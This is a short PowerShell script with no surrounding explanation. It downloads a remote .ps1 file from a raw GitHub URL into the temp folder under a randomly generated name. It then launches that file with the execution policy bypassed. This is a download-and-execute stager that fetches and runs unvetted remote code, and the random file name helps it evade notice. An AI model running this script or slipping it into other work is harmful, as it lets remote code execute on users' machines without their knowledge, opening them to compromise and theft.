$url = "https://raw.githubusercontent.com/4V4loon/tools/master/pastebin/pastebin-run.ps1"
$chars = (48..57) + (65..90) + (97..122)
$file="$env:tmp\$(-join ($chars | Get-Random -Count 9 | ForEach-Object {[char]$_})).ps1"
Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $file
Start-Process -FilePath powershell.exe -ArgumentLis "-executionpolicy bypass -file $file" -NoNewWindow

